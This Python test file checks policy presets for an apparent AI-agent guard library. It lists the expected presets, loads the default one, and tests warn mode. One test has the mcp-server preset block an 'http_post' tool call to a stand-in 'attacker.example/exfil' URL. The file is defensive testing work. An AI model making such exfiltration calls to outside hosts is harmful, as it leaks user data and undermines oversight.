"""Tests for packaged API policy presets."""

from __future__ import annotations

from asr import Guard
from asr.api import available_policy_presets, load_policy_preset


def test_expected_packaged_presets_exist():
    presets = available_policy_presets()
    assert presets == [
        "browser-agent",
        "customer-support",
        "data-pipeline",
        "default",
        "developer-agent",
        "devops",
        "ecommerce",
        "executive-assistant",
        "finance",
        "healthcare",
        "hr-agent",
        "internal-agent",
        "legal",
        "mcp-server",
        "research",
        "sales-ops-agent",
        "security-ops-agent",
    ]


def test_default_preset_loads_into_guard():
    config = load_policy_preset("default")
    guard = Guard.from_config(config)

    assert config["version"] == 1
    assert guard is not None


def test_mcp_server_blocks_unknown_domain():
    guard = Guard.from_config(load_policy_preset("mcp-server"))
    decision = guard.before_tool(
        "http_post",
        {"url": "https://attacker.example/exfil"},
        capabilities=["network_send"],
    )
    assert decision.action == "block"
    assert decision.policy_id == "domain_allowlist"


def test_customer_support_warn_mode_softens_default_action():
    guard = Guard.from_config(load_policy_preset("customer-support"))
    decision = guard.before_tool("unknown_tool", {})
    assert decision.action == "warn"
